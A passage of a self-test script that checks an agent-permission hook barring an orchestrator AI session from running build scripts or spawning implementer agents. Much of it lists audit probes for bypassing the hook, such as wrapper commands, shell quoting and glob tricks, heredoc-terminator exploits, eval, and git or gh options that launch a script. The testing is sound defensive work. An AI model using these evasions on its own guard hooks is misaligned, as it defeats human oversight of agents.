#!/usr/bin/env bash
set -uo pipefail

# Self-test for the hook half of the orchestrator role guard
# (self/features/orchestrator-role-guard): hooks/allow-repo-commands.sh denies a build script
# and an implementer delegate in a session that is an orchestration record's `session`, with
# the reason hooks/orchestrator_role.py renders. Run by self/gate.sh, or by hand:
# bash self/tests/hook-orchestrator-role.sh
#
# Fixtures, under mktemp -d, each with the hook's files copied in (orchestrator_role.py
# beside policy.py and env_profile.py) and a record `self/orchestrations/wave/README.md`
# whose fence `session` is S:
#   C  a consuming repo — the hook under agentTooling/hooks/, the record under
#      agentTooling/self/orchestrations/;
#   S  agentTooling's own shape — the hook under hooks/, the record under self/orchestrations/.
# Every case is fed the PreToolUse payload (tool_name, session_id, cwd, tool_input) under
# BOTH profiles, local and cloud.
#
# Asserts:
#   H1. Bash `feature-start.sh x --method direct --branch claude/x` from S is denied, the
#       reason naming the slug, the record and templates/plans/ORCHESTRATOR_BRIEF.md; so are
#       `run-batch.sh --self x`, `bash run-review.sh x`, `feature-close.sh x`, run-plans.sh
#       and run-verify.sh behind a chain (`ls && … run-plans.sh x`);
#   H2. the same commands from another session, or with no session_id, are not denied for
#       that reason (today's answer);
#   H3. from S, `ls`, `cat …/feature-start.sh`, orchestration-capture.sh and `manifest.py
#       --orchestration wave get session` are not denied by this rule;
#   H4. Agent from S with a prompt beginning `feature: <repo>/x` is denied with the reason;
#   H5. Agent from S whose prompt mentions `feature: ` mid-text is not the role denial (it is
#       the brief-header rule's deny, self/tests/hook-brief-header.sh), and one with no
#       prompt prints nothing;
#   H6. Agent from another session with the marker prints nothing;
#   H7. malformed payloads (no tool_input, a non-string prompt, a non-string command, an
#       empty session id) never exit non-zero and are never denied by the rule;
#   H8. agentTooling's own shape answers the same (the table runs over both fixtures);
#   H9. the role deny reads brief_header.parse, as the header check does: an Agent from S
#       whose brief opens `feature: none — <reason>` prints nothing (an orchestrator can
#       still spawn an analysis delegate), and an implementer brief behind a leading
#       newline (`\nfeature: <repo>/x`) is denied with the role reason.
#   H10. a COORDINATOR record (`"kind": "coordinator"`, self/features/coordinator-cost-records/)
#       naming session K is no role: from K — with and without a subagent's `agent_id`, the
#       payload a coordinator's delegate sends — a build script and an `Agent` implementer
#       brief are never the role denial (the brief prints nothing).
#   H11. (self/features/hook-role-hardening/, F1(b)) the orchestrator's record hand-edited to
#       drop the role still denies an implementer brief and feature-start.sh: `kind:
#       coordinator` added where a feature entry carries `session` or `branch`, or a later
#       `{}`, coordinator or other-session fence appended; a genuine coordinator record
#       (features with pr/report, session/branch null) stays exempt.
#   H12. (F4) a build script behind a wrapper (`env`, `command`, `env NAME=v`, `env env`,
#       `/usr/bin/env`, `exec -a`, `nohup`, `time`, `nice`, `timeout`, `stdbuf`, `xargs`,
#       `sudo`), quoted, split by quotes, as a glob or brace group, inside `bash -c`, piped
#       into `sh`, behind `find -exec` or in a heredoc is denied from S with the role
#       reason, and never the role denial from another session or none; a reader that only
#       prints a script (`grep`, `head`, `wc`, `cat … | grep`) is not.
#   H13. a session named only by the ledger in the git dir (`<session> <slug>` in
#       .git/agenttooling-orchestrators, which orchestration-start.sh appends) is denied a
#       build script and an implementer brief; another session is not.
#   H14. (security audit round 1, F8b) ANSI-C/locale quoting, extended globs, another case,
#       `rg --pre`, `cat … | bash`, `find -exec {}`, GIT_EXTERNAL_DIFF and a git alias naming
#       a build script are denied from S with the role reason.
#   H15. (F10) an orchestrator's own job is never the role denial: the heredoc commit message,
#       a message naming a script, the push of `$(git branch --show-current)`, `gh pr create`
#       with a heredoc body, git log/diff/show/grep, `sed -n Np`, `bash -n`, `find -name`,
#       and, since the allowlist (round 3), only what it admits: the heredoc commit (quoted with
#       either quote), a literal commit, the push of `$(git branch --show-current)` and of
#       HEAD, `gh pr create` with a heredoc or literal body, git log/diff/show/fetch/add/status,
#       `sed -n Np`, `find -name`, `rg`, `gh pr view`, readers in a pipeline with `2>&1`.
#   H17. (round 2, N1/N4) `bash -n +n f`, `bash -n +o noexec f`, `sh -n +n f` are denied
#       from S and never `allow` from another session (plain `bash -n f` still is); a
#       command spelling `__heredoc_argument_N__` and running a build script is denied.
#   H18. (round 3, the allowlist) round 1's sanctioned items the allowlist does not admit
#       (`git grep`, `bash -n`, `find -exec`, `$HOME`, globs, a `for` loop) and abuse of the
#       two allowed expansions (an unquoted heredoc delimiter, text after the terminator, a
#       delimiter line in the body, a command after it, a heredoc as a path, the branch
#       substitution anywhere but the pushed branch, unquoted) are the allowlist denial;
#   H19. every probe of round 2's c4/c5/c7/e1 the allowlist does not admit is denied from S
#       with the role reason (N2, N3, N5, N6, N7 among them);
#   H20. for a non-orchestrator session, round 2's 133-command regression set answers
#       byte-identically to origin/main's hook (skipped with a line where there is none);
#   H21. (round 3) every row of the auditor's a1–a4/a6 probes from S: the 205 the allowlist
#       admits are not its denial, every other row is denied (R1's expansions hidden in quotes
#       or glued to a word among them);
#   H22. (round 3, R2/R3/R7/R8) entry points resolved against the cwd (a planted report.py at a
#       consuming repo's root or in a records folder is no entry point; the vendored copy's
#       is), refspecs are no branch, `git add` of a path holding `.git` is refused,
#       `orchestration-start.sh --session`, report.py with a path slug or `--self`,
#       capture_planning.py with `--`, `uniq -- - -out`, `tail -f`, `diff -l`, `gh pr view
#       -R`, `--show-signature` and `%G` are refused, and the denial sends other work to a
#       separate session;
#   H23. (round 4) `printf -v` in any spelling (a subscripted name runs a substitution) is the
#       allowlist denial, plain printf is admitted; a symlink to the real
#       orchestration-start.sh is no entry point;
#   H24. (lifecycle round 2's audit, A1/A2) `git add` of pathspec magic, globs (quoted too),
#       directories, a nested `.git` or a missing file is the allowlist denial, of an existing
#       regular file admitted; `date` with an operand that is not `+FORMAT` (it sets the
#       clock) is denied — `date -Id MMDD…` too (lifecycle round 3's audit, C1: `-I` takes
#       the `d`) — and `date`, `date +FMT`, `date -d X +FMT`, `date -r FILE`, `date -Id` admitted;
#   H25. (self/features/orchestration-records-in-repo/, round 3) `manifest.py --self
#       --orchestration …` and `report.py --self --orchestration <slug>` are admitted (`--self`
#       first only; after `--orchestration`, twice, or without it: denied); an orchestrator
#       recorded in the consuming repo's `plans/orchestrations/` is denied a build script and an
#       implementer brief with the role reason naming that record, held to the allowlist, and
#       its record tool admitted;
#   H26. (self/features/hook-audit-gaps/, B1) the audit's heredoc-terminator exploit — a
#       commit message or PR body whose `EOF)` bash does not take as the terminator, then
#       `; ./feature-start.sh zz ; echo "⏎EOF⏎)"` — is denied from S with the role reason;
#       round 2 (its audit's E1): so is every body line that begins with the delimiter and
#       goes on to the `)` (`EOF )`, `EOF⇥)`, `EOFS)`, `EOF x)`, `EOFxyz ; true)`, `EOF'q')`),
#       and H21's `EOF ⏎` row is denied rather than admitted;
#   H27. (self/features/python-entry-exact/) `manifest.py --orchestration`, `report.py
#       --checkout` and the capture listing take their exact shapes only: the propagation
#       audit's B1 (a repeated `--orchestration`) and B2 (an abbreviated writing flag beside a
#       decoy `--list-` value), the repeat in each position, `=` forms, every abbreviation of
#       each writing mode and extra words are the allowlist denial; the shapes are admitted;
#   H28. (self/features/orchestration-start-branch-v2/) from S, in the consumer fixture, `git mv
#       agentTooling/self/orchestrations/wave plans/orchestrations/wave` from the repo's root —
#       its own record, the move LEGACY_RECORD_REFUSAL names — is approved outright, under both
#       profiles; beside another command it is not approved outright; another record, another
#       destination or file, an option, an extra word, a `-C`, another cwd, a standalone
#       checkout and a destination already there are the allowlist denial; another session's
#       same move is not approved outright; round 2: with no `plans/`, the printed remedy
#       (`mkdir -p plans/orchestrations && git mv …`, shared_rules.LEGACY_RECORD_MOVE) is
#       approved and, the record committed, really moves it, while every other `mkdir` spelling
#       or join is not approved; a symlinked `plans` or `plans/orchestrations`, and a record
#       README that is a symlink into another folder, are never approved;
#   H16. (F8a) from S, pytest, `python3 -m pytest`, `npm run test`, `npm test`,
#       `./self/gate.sh` and `./check-plans.sh` are never `allow`; from another session they
#       are never the role denial.
# Every invocation pins the profile and clears CLAUDE_CODE_REMOTE. No model, no network.

AT="$(cd "$(dirname "$0")/../.." && pwd)"
TMP="$(mktemp -d "${TMPDIR:-/tmp}/hook-orchestrator-role.XXXXXX")"
trap 'rm -rf "$TMP"' EXIT
TMP="$(cd "$TMP" && pwd -P)"

echo "hook-orchestrator-role"
python3 - "$AT" "$TMP" <<'PY'
import json, os, shutil, subprocess, sys

AT, TMP = sys.argv[1], sys.argv[2]
HOOK_FILES = ("allow-repo-commands.sh", "policy.py", "env_profile.py", "orchestrator_role.py",
              "shared_rules.py", "brief_header.py")
HOOK_NAME = "allow-repo-commands.sh"
RECORD_SLUG = "wave"
RECORD_REL = "self/orchestrations/%s/README.md" % RECORD_SLUG
SESSION_S = "5e5e5e5e-0000-0000-0000-000000000001"
SESSION_T = "7a7a7a7a-0000-0000-0000-000000000002"
SESSION_K = "c0c0c0c0-0000-0000-0000-000000000003"
COORD_SLUG = "coord"
DELEGATE_AGENT_ID = "a0123456789abcdef"
BRIEF_PATH = "templates/plans/ORCHESTRATOR_BRIEF.md"
ROLE_MARK = "is the orchestrator of"
PROFILE_ENV = "AGENTTOOLING_PROFILE"
REMOTE_ENV = "CLAUDE_CODE_REMOTE"
PROFILES = ("local", "cloud")
MARKER_PROMPT = "feature: agentTooling/x\nYou are the implementer for one feature."
MID_PROMPT = "Please read this.\nfeature: agentTooling/x is what the brief says."
NONE_PROMPT = "feature: none — read-only analysis of the wave\nSummarize the open PRs."
LEADING_NL_PROMPT = "\nfeature: agentTooling/x\nYou are the implementer for one feature."
DENY, ALLOW, ASK, SILENT, ERR = "DENY", "ALLOW", "ASK", "silent", "ERR"


def new_fixture(root, hook_dir, tooling_dir):
    os.makedirs(root)
    hooks = os.path.join(root, hook_dir)
    os.makedirs(hooks)
    for name in HOOK_FILES:
        src = os.path.join(AT, "hooks", name)
        if os.path.exists(src):
            shutil.copy2(src, os.path.join(hooks, name))
    record = os.path.normpath(os.path.join(root, tooling_dir, RECORD_REL))
    os.makedirs(os.path.dirname(record))
    with open(record, "w") as f:
        f.write("# Orchestration: %s\n\n```json\n%s\n```\n" % (
            RECORD_SLUG, json.dumps({"slug": RECORD_SLUG, "session": SESSION_S, "features": []})))
    # H10's coordinator record, beside it: a cost record naming SESSION_K, never a role
    coordinator = os.path.join(os.path.dirname(os.path.dirname(record)), COORD_SLUG, "README.md")
    os.makedirs(os.path.dirname(coordinator))
    with open(coordinator, "w") as f:
        f.write("# Coordination: %s\n\n```json\n%s\n```\n" % (COORD_SLUG, json.dumps(
            {"slug": COORD_SLUG, "kind": "coordinator", "session": SESSION_K, "features": []})))
    subprocess.run(["git", "-C", root, "init", "-q"], check=True, capture_output=True)
    return os.path.join(hooks, HOOK_NAME), record


# name -> (root, hook, record, command prefix for the scripts)
CONSUMER = os.path.join(TMP, "consumer")
SELF = os.path.join(TMP, "self-shape")
HOOK_C, RECORD_C = new_fixture(CONSUMER, os.path.join("agentTooling", "hooks"), "agentTooling")
HOOK_S, RECORD_S = new_fixture(SELF, "hooks", ".")
FIXTURES = {"consumer": (CONSUMER, HOOK_C, RECORD_C, "./agentTooling/", "agentTooling/"),
            "self": (SELF, HOOK_S, RECORD_S, "./", "")}


def run_hook(hook, root, payload_text, profile):
    env = {k: v for k, v in os.environ.items()
           if k not in (PROFILE_ENV, REMOTE_ENV, "CLAUDE_PROJECT_DIR")}
    env.update({"CLAUDE_PROJECT_DIR": root, "TMPDIR": TMP, "HOME": TMP, PROFILE_ENV: profile})
    return subprocess.run([hook], input=payload_text, capture_output=True, text=True, env=env)


def decode(p):
    """(decision, reason): DENY/ALLOW/ASK, `silent` for no output, ERR for a non-zero exit
    or output that is not the hook protocol."""
    if p.returncode != 0:
        return ERR, p.stderr.strip()[-300:]
    if not p.stdout.strip():
        return SILENT, ""
    try:
        out = json.loads(p.stdout)["hookSpecificOutput"]
    except (ValueError, KeyError, TypeError):
        return ERR, p.stdout[:300]
    decision = {"allow": ALLOW, "deny": DENY, "ask": ASK}.get(out.get("permissionDecision"), ERR)
    return decision, out.get("permissionDecisionReason", "")


def bash(fixture, profile, command, session):
    root, hook = FIXTURES[fixture][0], FIXTURES[fixture][1]
    payload = {"tool_name": "Bash", "cwd": root, "tool_input": {"command": command}}
    if session is not None:
        payload["session_id"] = session
    return decode(run_hook(hook, root, json.dumps(payload), profile))


def agent(fixture, profile, tool_input, session):
    root, hook = FIXTURES[fixture][0], FIXTURES[fixture][1]
    payload = {"tool_name": "Agent", "cwd": root, "tool_input": tool_input}
    if session is not None:
        payload["session_id"] = session
    return decode(run_hook(hook, root, json.dumps(payload), profile))


fails = 0


def check(label, ok, detail=""):
    global fails
    if ok:
        print("  ok    %s" % label)
    else:
        fails += 1
        print("  FAIL  %s%s" % (label, (" — " + str(detail)[:400]) if detail else ""))


def role_reason(reason, record):
    return (ROLE_MARK in reason and RECORD_SLUG in reason and record in reason
            and BRIEF_PATH in reason)


for fixture, (root, hook, record, prefix, rel) in FIXTURES.items():
    for profile in PROFILES:
        tag = "%s/%s" % (fixture, profile)
        build = [
            "%sfeature-start.sh x --method direct --branch claude/x" % prefix,
            "%srun-batch.sh --self x" % prefix,
            "bash %srun-review.sh x" % prefix,
            "%sfeature-close.sh x" % prefix,
            "ls && %srun-plans.sh x" % prefix,
            "%srun-verify.sh --self x" % prefix,
        ]
        # H1: denied from S, with the reason
        for command in build:
            decision, reason = bash(fixture, profile, command, SESSION_S)
            check("H1 [%s] %s from the orchestrator is denied with the role reason" % (tag, command),
                  decision == DENY and role_reason(reason, record), "%s: %s" % (decision, reason))
        # H2: other session or none — today's answer, never this reason
        for command in build:
            for who, session in (("another session", SESSION_T), ("no session_id", None)):
                decision, reason = bash(fixture, profile, command, session)
                check("H2 [%s] %s from %s is not the role denial" % (tag, command, who),
                      decision != ERR and ROLE_MARK not in reason, "%s: %s" % (decision, reason))
        # H3: what stays allowed in S
        stays = [
            "ls",
            "cat %sfeature-start.sh" % rel,
            "%sorchestration-capture.sh wave" % prefix,
            "python3 %sanalysis/manifest.py --orchestration wave get session" % rel,
        ]
        for command in stays:
            decision, reason = bash(fixture, profile, command, SESSION_S)
            check("H3 [%s] %s from the orchestrator is not denied by the rule" % (tag, command),
                  decision != ERR and ROLE_MARK not in reason, "%s: %s" % (decision, reason))
        # H4: the Agent deny
        decision, reason = agent(fixture, profile, {"prompt": MARKER_PROMPT}, SESSION_S)
        check("H4 [%s] an Agent whose prompt opens `feature: ` from the orchestrator is denied" % tag,
              decision == DENY and role_reason(reason, record), "%s: %s" % (decision, reason))
        # H9: the role deny reads the same parse as the header check
        decision, reason = agent(fixture, profile, {"prompt": NONE_PROMPT}, SESSION_S)
        check("H9 [%s] an Agent whose brief opens `feature: none — …` from the orchestrator is allowed"
              % tag, decision == SILENT, "%s: %s" % (decision, reason))
        decision, reason = agent(fixture, profile, {"prompt": LEADING_NL_PROMPT}, SESSION_S)
        check("H9 [%s] an implementer brief behind a leading newline from the orchestrator is denied"
              % tag, decision == DENY and role_reason(reason, record), "%s: %s" % (decision, reason))
        # H5: not the role deny otherwise. A prompt with no brief header on its first line
        # is the brief-header rule's deny (self/tests/hook-brief-header.sh), never this one.
        for label, tool_input in (("a mid-text `feature: `", {"prompt": MID_PROMPT}),
                                  ("a prompt with leading text", {"prompt": " feature: x"})):
            decision, reason = agent(fixture, profile, tool_input, SESSION_S)
            check("H5 [%s] an Agent with %s from the orchestrator is not the role denial"
                  % (tag, label), decision in (SILENT, DENY) and ROLE_MARK not in reason,
                  "%s: %s" % (decision, reason))
        decision, _ = agent(fixture, profile, {"description": "x"}, SESSION_S)
        check("H5 [%s] an Agent with no prompt from the orchestrator prints nothing" % tag,
              decision == SILENT, decision)
        # H6: another session
        decision, _ = agent(fixture, profile, {"prompt": MARKER_PROMPT}, SESSION_T)
        check("H6 [%s] an Agent with the marker from another session prints nothing" % tag,
              decision == SILENT, decision)
        decision, _ = agent(fixture, profile, {"prompt": MARKER_PROMPT}, None)
        check("H6 [%s] ... and from a payload with no session_id" % tag, decision == SILENT, decision)
        # H7: malformed payloads never exit non-zero
        for label, payload in (
                ("an Agent with no tool_input", {"tool_name": "Agent", "session_id": SESSION_S}),
                ("an Agent with a null tool_input", {"tool_name": "Agent", "session_id": SESSION_S, "tool_input": None}),
                ("an Agent with a non-string prompt", {"tool_name": "Agent", "session_id": SESSION_S, "tool_input": {"prompt": 12}}),
                ("a Bash with no tool_input", {"tool_name": "Bash", "session_id": SESSION_S}),
                ("a Bash with a non-string command", {"tool_name": "Bash", "session_id": SESSION_S, "tool_input": {"command": ["x"]}}),
                ("an empty session id", {"tool_name": "Bash", "session_id": "", "tool_input": {"command": build[0]}}),
                ("a non-string session id", {"tool_name": "Agent", "session_id": 7, "tool_input": {"prompt": MARKER_PROMPT}})):
            p = run_hook(hook, root, json.dumps(payload), profile)
            decision, reason = decode(p)
            check("H7 [%s] %s exits 0 and is not the role denial" % (tag, label),
                  decision != ERR and ROLE_MARK not in reason, "%s: %s" % (decision, reason))
        p = run_hook(hook, root, "{not json", profile)
        check("H7 [%s] a payload that is not JSON exits 0 and prints nothing" % tag,
              p.returncode == 0 and not p.stdout.strip(), p.stderr[-200:])
        # H10: a coordinator record is no role, for the coordinator and for its delegates
        for who, extra in (("the coordinator", {}), ("its delegate", {"agent_id": DELEGATE_AGENT_ID})):
            for command in build:
                payload = {"tool_name": "Bash", "cwd": root, "session_id": SESSION_K,
                           "tool_input": {"command": command}}
                payload.update(extra)
                decision, reason = decode(run_hook(hook, root, json.dumps(payload), profile))
                check("H10 [%s] %s from %s of a coordinator record is not the role denial"
                      % (tag, command, who), decision != ERR and ROLE_MARK not in reason,
                      "%s: %s" % (decision, reason))
            payload = {"tool_name": "Agent", "cwd": root, "session_id": SESSION_K,
                       "tool_input": {"prompt": MARKER_PROMPT}}
            payload.update(extra)
            decision, reason = decode(run_hook(hook, root, json.dumps(payload), profile))
            check("H10 [%s] an implementer brief from %s of a coordinator record prints nothing"
                  % (tag, who), decision == SILENT, "%s: %s" % (decision, reason))

        # H12 (self/features/hook-role-hardening/, F4): a wrapper, a quote, a glob or a
        # brace group in front of a build script is still a run of it from S; from another
        # session it is never the role denial; readers that only print a script are not runs.
        wrapped = [
            "env %sfeature-start.sh x --method m" % prefix,
            "command %srun-plans.sh x" % prefix,
            "env CLAUDE_CODE_SESSION_ID=zz %srun-plans.sh x" % prefix,
            "env env %srun-plans.sh x" % prefix,
            "/usr/bin/env %srun-plans.sh x" % prefix,
            "env -i PATH=/usr/bin %srun-verify.sh x" % prefix,
            "exec -a x %sfeature-start.sh x" % prefix,
            "nohup %srun-batch.sh x" % prefix,
            "time %srun-review.sh x" % prefix,
            "nice -n 5 %srun-plans.sh x" % prefix,
            "timeout 60 %sfeature-close.sh x" % prefix,
            "stdbuf -oL %srun-plans.sh x" % prefix,
            "xargs %srun-plans.sh < /dev/null" % prefix,
            "sudo %srun-plans.sh x" % prefix,
            "\"%srun-plans.sh\" x" % prefix,
            "%srun-pla\"\"ns.sh x" % prefix,
            "%srun-pl*.sh x" % prefix,
            "%srun-{plans,verify}.sh x" % prefix,
            "bash -c '%srun-plans.sh x'" % prefix,
            "echo %srun-plans.sh | sh" % prefix,
            "find . -name run-plans.sh -exec {} x \\;",
            "ls && env %srun-plans.sh x" % prefix,
            "bash <<'EOF'\n%srun-plans.sh x\nEOF" % prefix,
            # a substitution inside the script's word, quoted or in backticks: the word is
            # kept whole for this judge (round 4, orchestration-record-fixes)
            "\"%srun-$(echo plans).sh\" --self x" % prefix,
            "bash \"%srun-$(echo plans).sh\" --self x" % prefix,
            "\"%srun-`echo plans`.sh\" --self x" % prefix,
            "%srun-`echo plans`.sh --self x" % prefix,
            "bash \"%sru$(true)n-plans.sh\"" % prefix,
            "\"%srun-plans$(true).sh\"" % prefix,
        ]
        for command in wrapped:
            decision, reason = bash(fixture, profile, command, SESSION_S)
            check("H12 [%s] %r from the orchestrator is denied with the role reason" % (tag, command),
                  decision == DENY and role_reason(reason, record), "%s: %s" % (decision, reason))
            for who, session in (("another session", SESSION_T), ("no session_id", None)):
                decision, reason = bash(fixture, profile, command, session)
                check("H12 [%s] %r from %s is not the role denial" % (tag, command, who),
                      decision != ERR and ROLE_MARK not in reason, "%s: %s" % (decision, reason))
        for command in ("grep -n refuse %srun-plans.sh" % rel,
                        "head -5 %sfeature-close.sh %srun-review.sh" % (rel, rel),
                        "wc -l %srun-plans.sh" % rel,
                        "cat %srun-plans.sh | grep -c x" % rel):
            decision, reason = bash(fixture, profile, command, SESSION_S)
            check("H12 [%s] %r from the orchestrator is not the role denial (a reader)" % (tag, command),
                  decision != ERR and ROLE_MARK not in reason, "%s: %s" % (decision, reason))

# H11 (self/features/hook-role-hardening/, F1(b)): the orchestrator's own record, hand-edited
# to drop the role, still denies — `kind: coordinator` added to an orchestrator-shaped record
# (a feature entry carrying `session` or `branch`), a later `{}` fence appended, a later
# coordinator fence appended. A genuine coordinator record (features with pr/report only, or
# none) stays exempt — H10 above, and once more here with features.
ORCH_FEATURE = {"repo": "agentTooling", "slug": "f", "session": "1111", "branch": "claude/f",
                "pr": None, "report": None}
COORD_FEATURE = {"repo": "agentTooling", "slug": "f", "session": None, "branch": None,
                 "pr": "https://example.invalid/pr/1", "report": "self/features/f/report.json"}
role_fence = json.dumps({"slug": RECORD_SLUG, "session": SESSION_S, "features": [ORCH_FEATURE]})
EDITS = [
    ("kind coordinator added to an orchestrator-shaped fence", True, "```json\n%s\n```\n" % json.dumps(
        {"slug": RECORD_SLUG, "kind": "coordinator", "session": SESSION_S, "features": [ORCH_FEATURE]})),
    ("... with only a branch recorded", True, "```json\n%s\n```\n" % json.dumps(
        {"slug": RECORD_SLUG, "kind": "coordinator", "session": SESSION_S,
         "features": [dict(ORCH_FEATURE, session=None)]})),
    ("a later {} fence appended", True, "```json\n%s\n```\n\nnotes\n\n```json\n{}\n```\n" % role_fence),
    ("a later coordinator fence appended", True, "```json\n%s\n```\n\n```json\n%s\n```\n" % (
        role_fence, json.dumps({"kind": "coordinator", "session": SESSION_S}))),
    ("a later fence naming another session appended", True, "```json\n%s\n```\n\n```json\n%s\n```\n" % (
        role_fence, json.dumps({"session": SESSION_T}))),
    ("a genuine coordinator record with pr/report features", False, "```json\n%s\n```\n" % json.dumps(
        {"slug": RECORD_SLUG, "kind": "coordinator", "session": SESSION_S, "features": [COORD_FEATURE]})),
]
for fixture, (root, hook, record, prefix, rel) in FIXTURES.items():
    with open(record) as f:
        original = f.read()
    for label, is_role, fences in EDITS:
        with open(record, "w") as f:
            f.write("# Orchestration: %s\n\n%s" % (RECORD_SLUG, fences))
        for profile in PROFILES:
            tag = "%s/%s" % (fixture, profile)
            a_decision, a_reason = agent(fixture, profile, {"prompt": MARKER_PROMPT}, SESSION_S)
            b_decision, b_reason = bash(fixture, profile, "%sfeature-start.sh x --method m" % prefix, SESSION_S)
            if is_role:
                check("H11 [%s] %s: an implementer brief is still denied" % (tag, label),
                      a_decision == DENY and role_reason(a_reason, record), "%s: %s" % (a_decision, a_reason))
                check("H11 [%s] %s: feature-start.sh is still denied" % (tag, label),
                      b_decision == DENY and role_reason(b_reason, record), "%s: %s" % (b_decision, b_reason))
            else:
                check("H11 [%s] %s: an implementer brief prints nothing" % (tag, label),
                      a_decision == SILENT, "%s: %s" % (a_decision, a_reason))
                check("H11 [%s] %s: feature-start.sh is not the role denial" % (tag, label),
                      b_decision != ERR and ROLE_MARK not in b_reason, "%s: %s" % (b_decision, b_reason))
    with open(record, "w") as f:
        f.write(original)

# H14 (security audit round 1, F8b and more of F4): ANSI-C and locale quoting, extended
# globs, a name in another case, `rg --pre` and a launcher reading a reader's output are runs
# from S. H15 (F10): what an orchestrator's own job needs is never the role denial — its
# records commit with the heredoc message, the push of its branch, its PR, a message naming
# a script, git/sed/bash -n reads of a script, `$VAR`, `{}` in a reading -exec, globs that
# list. H16 (F8a): from S, a runner that executes repo code is never `allow` (it falls
# through to the human); from another session the same commands are judged as before.
ANSI_AND_FRIENDS = [
    "./$'\\x72un-plans.sh' x", "$'./run-plans.sh' x", "./run-plans$'.'sh x",
    "./run$'-'plans.sh", "./run-plans$'\\056'sh", "./feature-st$'art'.sh x",
    "CLAUDE_CODE_SESSION_ID=zz ./$'\\x72un-plans.sh' --self nope", "./$\"run\"-plans.sh x",
    "./@(run-plans).sh x", "./run-plans.+(sh) x", "./Run-Plans.sh", "RUN-PLANS.SH",
    "rg --pre ./run-plans.sh x README.md", "rg --hostname-bin ./run-plans.sh x README.md",
    "cat run-plans.sh | bash", "find . -maxdepth 1 -name 'run-pl*' -exec {} x \\;",
    "GIT_EXTERNAL_DIFF=./run-plans.sh git diff HEAD", "git -c alias.x='!./run-plans.sh' x",
]
# H19 (round 3, the allowlist): every probe of security audit round 2's c4/c5/c7/e1 lists that
# the allowlist does not admit (N2/N3/N5/N6/N7 among them) is denied from S with the role
# reason. `\\n` in a line stands for a newline, as in the auditor's probe files.
ROUND2_PROBES = [
    '! ./run-plan?.sh',
    '"$(cat <<\'EOF\'\\n./run-plan?.sh\\nEOF\\n)" --self x',
    '"$(cat <<\'EOF\'\\n./run-plans.sh\\nEOF\\n)" --self x',
    '"./run-plan"?.sh',
    '( exec ./run-plan?.sh )',
    './check-plans.sh --self',
    './run-plan"?".sh',
    "./run-plan'?'.sh",
    './run-plan?."sh"',
    './run-plan\\?.sh',
    './run-plans.s\\h',
    './run-plans.sh __heredoc_argument_0__',
    './run-plans.sh#',
    './run-plans.sh\\',
    './run‐plans.sh',
    './self/gate.sh',
    '/tmp/claude-0/-home-user/4cba07a3-a87d-5001-97c1-4a7b4cc0510c/scratchpad/audit-hrh2/repo/self/gate.sh',
    '2>&1 ./run-plans.sh',
    '<README.md ./run-plan?.sh',
    '>/dev/null ./run-plan?.sh',
    '[[ -x ./run-plans.sh ]] && ./run-plan?.sh',
    'awk \'BEGIN{system("./run-pl*.sh x")}\'',
    'bash "$(cat <<\'EOF\'\\nrun-plan?.sh\\nEOF\\n)"',
    'bash "$(cat <<\'EOF\'\\nrun-plans.sh\\nEOF\\n)"',
    "bash -c './run-pl*.sh --self x'",
    "bash -c './run-pl*.sh'",
    'bash -n +n ./run-plans.sh --self x',
    'bash -n +n run-plans.sh',
    'bash -n +n x.sh',
    'bash -n +o noexec run-plans.sh',
    'bash -n +o noexec x.sh',
    'bash -n run-plans.sh --self x',
    'bash -n x.sh',
    'bash -n x.sh run-plans.sh',
    'case x in x) ./run-plan?.sh;; esac',
    'cat "$(./run-plans.sh)"',
    'coproc ./run-plan?.sh',
    'coproc ./run-plan?.sh; wait',
    'docker run x ./run-plan?.sh',
    'echo "$(./run-plans.sh z)"',
    'echo "$(./x.sh z)"',
    'echo "$(cat <<EOF\\n$(./run-plans.sh --self x)\\nEOF\\n)"',
    'echo "$(cat <<EOF\\n$(./x.sh --self x)\\nEOF\\n)"',
    'echo __heredoc_argument_0__; ./run-plans.sh --self x',
    'env pytest -q',
    "env sh -c './run-plan?.sh; true'",
    'env x "$(cat <<\'EOF\'\\nmentions run-plans.sh\\nEOF\\n)"',
    'eval "./run-plan?.sh --self x"',
    "eval './run-pl*.sh x'",
    'exec ./run-plan?.sh',
    'f() { ./run-plan?.sh; }; f',
    'for x in 1; do ./run-plan?.sh; done',
    'function f { ./run-plan?.sh; }; f',
    "gh alias set x '!./run-plans.sh'",
    'gh api repos/o/r/contents/x --input run-plans.sh',
    'gh extension exec x',
    'gh pr checkout 1',
    'gh pr merge 1 --squash',
    'gh repo clone o/r -- --upload-pack=./run-plans.sh',
    'gh repo clone o/r -- -c core.sshCommand=./run-plans.sh',
    "git -c alias.x='!./run-pl*.sh' x",
    'git -c core.hooksPath=hd commit -m x',
    'git -c core.pager=./run-plan?.sh -p log',
    'git -c core.pager=./run-plan?.sh log',
    'git -c core.pager=./run-plans.sh log',
    'git -c core.sshCommand=./run-plan?.sh push',
    'git bisect run ./run-plan?.sh',
    'git commit --allow-empty -m "$(cat <<\'EOF\'\\nmsg\\nEOF\\n./run-plans.sh --self x)"',
    'git commit --allow-empty -m "$(cat <<EOF\\n$(env -u CLAUDE_CODE_SESSION_ID ./run-plans.sh --self x)\\nEOF\\n)"',
    'git commit -m "$(./run-plans.sh)"',
    'git commit -m "$(cat <<\'EOF\'\\nmsg\\nEOF\\n)" "$(./run-plans.sh)"',
    'git commit -m "$(cat <<\'EOF\'\\nmsg\\nEOF\\n)" && ./run-plans.sh x',
    'git commit -m "$(cat <<\'EOF\'\\nmsg\\nEOF\\n)"; ./run-plan?.sh x',
    'git commit -m "$(cat <<\'EOF\'\\nmsg\\nEOF\\n./run-plan?.sh --self x)"',
    'git commit -m "$(cat <<\'EOF\'\\nmsg\\nEOF\\n./run-plans.sh --self x)"',
    'git commit -m "$(cat <<\'EOF\'\\nmsg\\nEOF\\n./x.sh)"',
    'git commit -m "$(cat <<EOF\\n$(./run-plans.sh --self x)\\nEOF\\n)"',
    'git commit -m "$(cat <<EOF\\n$(env -u CLAUDE_CODE_SESSION_ID ./run-plans.sh --self x)\\nEOF\\n)"',
    'git commit -m "$(cat <<EOF\\n`./run-plans.sh --self x`\\nEOF\\n)"',
    'git commit -m __heredoc_argument_0__ && ./run-plans.sh --self x',
    'git commit -m x --no-verify',
    'git diff --no-index --ext /dev/null README.md',
    'git grep --open-files-in=./run-plans.sh hi',
    'git grep --open-files-in=./run-plans.sh refuse',
    'git grep --open=./run-plans.sh refuse',
    'git grep -O./run-plans.sh refuse',
    'git grep -n -O ./run-plans.sh refuse',
    'git grep -nO./run-plans.sh hi',
    'git grep -nO./run-plans.sh refuse',
    'git grep -nO./x.sh hi',
    'git log "$(./run-plan?.sh)"',
    'git log --ext -p -1',
